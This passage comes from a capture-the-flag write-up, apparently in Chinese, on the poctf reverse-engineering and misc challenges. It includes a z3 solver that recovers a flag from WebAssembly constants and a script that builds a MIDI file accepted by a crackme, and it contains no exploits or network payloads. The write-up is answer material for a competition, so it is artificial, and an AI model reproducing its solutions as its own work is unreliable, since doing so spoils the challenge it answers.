</span></span><span class=line><span class=cl>        <span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>dec</span> <span class=o>=</span> <span class=n>decrypt_bytes</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>s</span> <span class=o>=</span> <span class=n>dec</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s2>&#34;utf-8&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>s</span> <span class=o>=</span> <span class=n>dec</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s2>&#34;latin1&#34;</span><span class=p>,</span> <span class=n>errors</span><span class=o>=</span><span class=s2>&#34;replace&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>s</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=reverse-200-2-bearing-the-load>Reverse 200-2 Bearing the Load</h2><p><img src=https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic1fdbdc1dc270ece4b9798f93c49b9eb0-20251104214358-td9d0e4.png alt=1fdbdc1dc270ece4b9798f93c49b9eb0></p><p>断下,点击v6即可得到flag</p><h2 id=reverse-200-3-the-glass-bead-game>Reverse 200-3 The Glass Bead Game</h2><p><img src=https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picimage-20251104214841-9v5tjsg.png alt=image></p><h2 id=reverse-300-1-through-a-glass-darkly>Reverse 300-1 Through a Glass Darkly</h2><p><img src=https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picimage-20251104210532-v4d343m.png alt=image></p><p>直接z3求解</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># solve_flag_z3_prefix.py</span>
</span></span><span class=line><span class=cl><span class=c1># pip install z3-solver</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>z3</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>mem1024</span> <span class=o>=</span> <span class=p>[</span><span class=nb>ord</span><span class=p>(</span><span class=n>c</span><span class=p>)</span> <span class=k>for</span> <span class=n>c</span> <span class=ow>in</span> <span class=s2>&#34;through_a_glass_darkly&#34;</span><span class=p>]</span>  <span class=c1># len=22</span>
</span></span><span class=line><span class=cl><span class=n>mem1056</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>    <span class=mh>0x43</span><span class=p>,</span> <span class=mh>0x55</span><span class=p>,</span> <span class=mh>0x84</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0xF7</span><span class=p>,</span> <span class=mh>0x5C</span><span class=p>,</span> <span class=mh>0x90</span><span class=p>,</span> <span class=mh>0xE9</span><span class=p>,</span> <span class=mh>0xA8</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mh>0xCD</span><span class=p>,</span> <span class=mh>0x26</span><span class=p>,</span> <span class=mh>0xBC</span><span class=p>,</span> <span class=mh>0x07</span><span class=p>,</span> <span class=mh>0x4A</span><span class=p>,</span> <span class=mh>0x0E</span><span class=p>,</span> <span class=mh>0xA8</span><span class=p>,</span> <span class=mh>0xE5</span><span class=p>,</span> <span class=mh>0x5A</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mh>0x48</span><span class=p>,</span> <span class=mh>0xE2</span><span class=p>,</span> <span class=mh>0xBA</span><span class=p>,</span> <span class=mh>0x77</span><span class=p>,</span> <span class=mh>0x7D</span><span class=p>,</span> <span class=mh>0x6E</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x86</span><span class=p>,</span> <span class=mh>0xBE</span>
</span></span><span class=line><span class=cl><span class=p>]</span>  <span class=c1># len=27</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>N</span> <span class=o>=</span> <span class=mi>27</span>  <span class=c1># 循环次数（.wat 中明确检查 27 个字节）</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 8位循环左移</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>rotl8</span><span class=p>(</span><span class=n>x</span><span class=p>:</span> <span class=n>BitVecRef</span><span class=p>,</span> <span class=n>s</span><span class=p>:</span> <span class=nb>int</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=n>BitVecRef</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>RotateLeft</span><span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=n>s</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 建立 8位输入变量 a[0..26]</span>
</span></span><span class=line><span class=cl><span class=n>a</span> <span class=o>=</span> <span class=p>[</span><span class=n>BitVec</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;a_</span><span class=si>{</span><span class=n>i</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>,</span> <span class=mi>8</span><span class=p>)</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>N</span><span class=p>)]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>s</span> <span class=o>=</span> <span class=n>Solver</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>N</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=c1># 选择 mem[1024] 的索引：i&lt;22 ? i : i-22</span>
</span></span><span class=line><span class=cl>    <span class=n>idx</span> <span class=o>=</span> <span class=n>i</span> <span class=k>if</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>22</span> <span class=k>else</span> <span class=n>i</span> <span class=o>-</span> <span class=mi>22</span>
</span></span><span class=line><span class=cl>    <span class=n>C</span> <span class=o>=</span> <span class=n>BitVecVal</span><span class=p>(</span><span class=n>mem1024</span><span class=p>[</span><span class=n>idx</span><span class=p>]</span> <span class=o>&amp;</span> <span class=mh>0xFF</span><span class=p>,</span> <span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>K</span> <span class=o>=</span> <span class=n>BitVecVal</span><span class=p>(</span><span class=n>mem1056</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>&amp;</span> <span class=mh>0xFF</span><span class=p>,</span> <span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># s(i) = ((i % 7) + 1) &amp; 7</span>
</span></span><span class=line><span class=cl>    <span class=n>si</span> <span class=o>=</span> <span class=p>((</span><span class=n>i</span> <span class=o>%</span> <span class=mi>7</span><span class=p>)</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>7</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># D = C XOR ((73*i + 19) &amp; 0xFF)</span>
</span></span><span class=line><span class=cl>    <span class=n>Di</span> <span class=o>=</span> <span class=n>C</span> <span class=o>^</span> <span class=n>BitVecVal</span><span class=p>(((</span><span class=mi>73</span> <span class=o>*</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>19</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xFF</span><span class=p>),</span> <span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># rot = ROTL8(D, s(i))</span>
</span></span><span class=line><span class=cl>    <span class=n>rot</span> <span class=o>=</span> <span class=n>rotl8</span><span class=p>(</span><span class=n>Di</span><span class=p>,</span> <span class=n>si</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># T8 = (K + 123 - 17*i) &amp; 0xFF</span>
</span></span><span class=line><span class=cl>    <span class=n>T8_val</span> <span class=o>=</span> <span class=p>(</span><span class=n>mem1056</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>+</span> <span class=mi>123</span> <span class=o>-</span> <span class=mi>17</span> <span class=o>*</span> <span class=n>i</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xFF</span>
</span></span><span class=line><span class=cl>    <span class=n>T8</span> <span class=o>=</span> <span class=n>BitVecVal</span><span class=p>(</span><span class=n>T8_val</span><span class=p>,</span> <span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 目标等式：a[i] == (rot XOR T8)</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span><span class=o>.</span><span class=n>add</span><span class=p>(</span><span class=n>a</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>==</span> <span class=p>(</span><span class=n>rot</span> <span class=o>^</span> <span class=n>T8</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># ===== 固定前缀 poctf{ =====</span>
</span></span><span class=line><span class=cl><span class=n>prefix</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;poctf{&#34;</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span><span class=p>,</span> <span class=n>ch</span> <span class=ow>in</span> <span class=nb>enumerate</span><span class=p>(</span><span class=n>prefix</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span><span class=o>.</span><span class=n>add</span><span class=p>(</span><span class=n>a</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>==</span> <span class=n>BitVecVal</span><span class=p>(</span><span class=n>ch</span><span class=p>,</span> <span class=mi>8</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>s</span><span class=o>.</span><span class=n>check</span><span class=p>()</span> <span class=o>!=</span> <span class=n>sat</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;unsat / 无解&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>m</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>model</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>flag_bytes</span> <span class=o>=</span> <span class=nb>bytes</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>m</span><span class=p>[</span><span class=n>a</span><span class=p>[</span><span class=n>i</span><span class=p>]]</span><span class=o>.</span><span class=n>as_long</span><span class=p>())</span> <span class=o>&amp;</span> <span class=mh>0xFF</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>N</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;flag:&#34;</span><span class=p>,</span> <span class=n>flag_bytes</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>UnicodeDecodeError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;flag (latin-1):&#34;</span><span class=p>,</span> <span class=n>flag_bytes</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;latin-1&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;hex :&#34;</span><span class=p>,</span> <span class=n>flag_bytes</span><span class=o>.</span><span class=n>hex</span><span class=p>())</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=reverse-300-2-make-the-pieces-sing>Reverse 300-2 Make the Pieces Sing</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl><span class=c1># coding: utf-8</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>make_rev300_mid.py
</span></span></span><span class=line><span class=cl><span class=s2>生成用于 rev300-2 的最小 MIDI（format 0），正确实现 VLQ 与 track length。
</span></span></span><span class=line><span class=cl><span class=s2>输出文件: rev300_song_fixed.mid
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pathlib</span> <span class=kn>import</span> <span class=n>Path</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 题目提示中给出的 40 字节十六进制指纹（20 对）</span>
</span></span><span class=line><span class=cl><span class=n>HEX_KEY</span> <span class=o>=</span> <span class=s2>&#34;550027202760306057602cc02cc050c027c02c60576029202960306059602ee05c605a6059602e60&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>OUT</span> <span class=o>=</span> <span class=n>Path</span><span class=p>(</span><span class=s2>&#34;rev300_song_fixed.mid&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>PPQ</span> <span class=o>=</span> <span class=mi>480</span>  <span class=c1># ticks per quarter (对解析无影响)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>vlq_encode</span><span class=p>(</span><span class=n>value</span><span class=p>:</span> <span class=nb>int</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>bytes</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;将非负整数编码为 MIDI VLQ（variable-length quantity）。&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>assert</span> <span class=n>value</span> <span class=o>&gt;=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=n>parts</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=n>parts</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>value</span> <span class=o>&amp;</span> <span class=mh>0x7F</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>value</span> <span class=o>&gt;&gt;=</span> <span class=mi>7</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>value</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>parts</span><span class=o>.</span><span class=n>append</span><span class=p>((</span><span class=n>value</span> <span class=o>&amp;</span> <span class=mh>0x7F</span><span class=p>)</span> <span class=o>|</span> <span class=mh>0x80</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>value</span> <span class=o>&gt;&gt;=</span> <span class=mi>7</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>bytes</span><span class=p>(</span><span class=nb>reversed</span><span class=p>(</span><span class=n>parts</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>be16</span><span class=p>(</span><span class=n>n</span><span class=p>:</span> <span class=nb>int</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>bytes</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>n</span><span class=o>.</span><span class=n>to_bytes</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=s2>&#34;big&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>be32</span><span class=p>(</span><span class=n>n</span><span class=p>:</span> <span class=nb>int</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>bytes</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>n</span><span class=o>.</span><span class=n>to_bytes</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span> <span class=s2>&#34;big&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>build_midi_from_hex</span><span class=p>(</span><span class=n>hex_key</span><span class=p>:</span> <span class=nb>str</span><span class=p>,</span> <span class=n>channel</span><span class=p>:</span> <span class=nb>int</span> <span class=o>=</span> <span class=mi>0</span><span class=p>,</span> <span class=n>vel_on</span><span class=p>:</span> <span class=nb>int</span> <span class=o>=</span> <span class=mh>0x40</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>bytes</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>hex_key</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>data</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>40</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>raise</span> <span class=ne>ValueError</span><span class=p>(</span><span class=s2>&#34;hex_key length != 40 bytes&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>pairs</span> <span class=o>=</span> <span class=p>[(</span><span class=n>data</span><span class=p>[</span><span class=n>i</span><span class=p>],</span> <span class=n>data</span><span class=p>[</span><span class=n>i</span><span class=o>+</span><span class=mi>1</span><span class=p>])</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>data</span><span class=p>),</span> <span class=mi>2</span><span class=p>)]</span>  <span class=c1># (pitch, dt)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 构造 track 事件字节流</span>
</span></span><span class=line><span class=cl>    <span class=n>events</span> <span class=o>=</span> <span class=nb>bytearray</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 选择使用 Note-On (0x90|ch) and Note-Off (0x80|ch) events</span>
</span></span><span class=line><span class=cl>    <span class=n>note_on_status</span> <span class=o>=</span> <span class=mh>0x90</span> <span class=o>|</span> <span class=p>(</span><span class=n>channel</span> <span class=o>&amp;</span> <span class=mh>0x0F</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>note_off_status</span> <span class=o>=</span> <span class=mh>0x80</span> <span class=o>|</span> <span class=p>(</span><span class=n>channel</span> <span class=o>&amp;</span> <span class=mh>0x0F</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>vel_off</span> <span class=o>=</span> <span class=mh>0x00</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Optional: 在 track 开头插入一个 track name meta event（不是必要的）</span>
</span></span><span class=line><span class=cl>    <span class=c1># events += vlq_encode(0) + bytes([0xFF, 0x03, 0x05]) + b&#34;REV30&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 累加的 tick 值由 SING 的逻辑计算（程序里会累加读取的每个 delta）</span>
</span></span><span class=line><span class=cl>    <span class=c1># 题目给的 dt 字节是：第一个为绝对 tick%256，后续为相对 delta%256。</span>
</span></span><span class=line><span class=cl>    <span class=c1># 这里直接把每个 dt 作为 MIDI 事件的 delta-time（以字节值作为整数）</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=n>pitch</span><span class=p>,</span> <span class=n>dt</span><span class=p>)</span> <span class=ow>in</span> <span class=n>pairs</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=c1># delta-time: dt (0..255); 用 VLQ 正确编码</span>
</span></span><span class=line><span class=cl>        <span class=n>events</span> <span class=o>+=</span> <span class=n>vlq_encode</span><span class=p>(</span><span class=n>dt</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=c1># Note-On (velocity 非零)</span>
</span></span><span class=line><span class=cl>        <span class=n>events</span> <span class=o>+=</span> <span class=nb>bytes</span><span class=p>([</span><span class=n>note_on_status</span><span class=p>,</span> <span class=n>pitch</span><span class=p>,</span> <span class=n>vel_on</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=c1># immediate Note-Off (delta=0)</span>
</span></span><span class=line><span class=cl>        <span class=n>events</span> <span class=o>+=</span> <span class=n>vlq_encode</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>events</span> <span class=o>+=</span> <span class=nb>bytes</span><span class=p>([</span><span class=n>note_off_status</span><span class=p>,</span> <span class=n>pitch</span><span class=p>,</span> <span class=n>vel_off</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># End of Track</span>
</span></span><span class=line><span class=cl>    <span class=n>events</span> <span class=o>+=</span> <span class=n>vlq_encode</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=nb>bytes</span><span class=p>([</span><span class=mh>0xFF</span><span class=p>,</span> <span class=mh>0x2F</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># SMF Header (format 0, one track)</span>
</span></span><span class=line><span class=cl>    <span class=n>header</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;MThd&#34;</span> <span class=o>+</span> <span class=n>be32</span><span class=p>(</span><span class=mi>6</span><span class=p>)</span> <span class=o>+</span> <span class=n>be16</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>be16</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=o>+</span> <span class=n>be16</span><span class=p>(</span><span class=n>PPQ</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Track chunk: 要写入长度字段（4 字节大端）为 events 的实际字节数</span>
</span></span><span class=line><span class=cl>    <span class=n>track</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;MTrk&#34;</span> <span class=o>+</span> <span class=n>be32</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>events</span><span class=p>))</span> <span class=o>+</span> <span class=nb>bytes</span><span class=p>(</span><span class=n>events</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>header</span> <span class=o>+</span> <span class=n>track</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>mid</span> <span class=o>=</span> <span class=n>build_midi_from_hex</span><span class=p>(</span><span class=n>HEX_KEY</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>OUT</span><span class=o>.</span><span class=n>write_bytes</span><span class=p>(</span><span class=n>mid</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Wrote </span><span class=si>{</span><span class=n>OUT</span><span class=si>}</span><span class=s2> (</span><span class=si>{</span><span class=nb>len</span><span class=p>(</span><span class=n>mid</span><span class=p>)</span><span class=si>}</span><span class=s2> bytes).&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;运行验证: ./rev300-2 rev300_song_fixed.mid&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picimage-20251105123307-umwmte4.png alt=image></p><h1 id=misc>Misc</h1><h2 id=misc-100-1-honey-i-shrunk-the-kids>Misc 100-1 Honey, I Shrunk the Kids</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
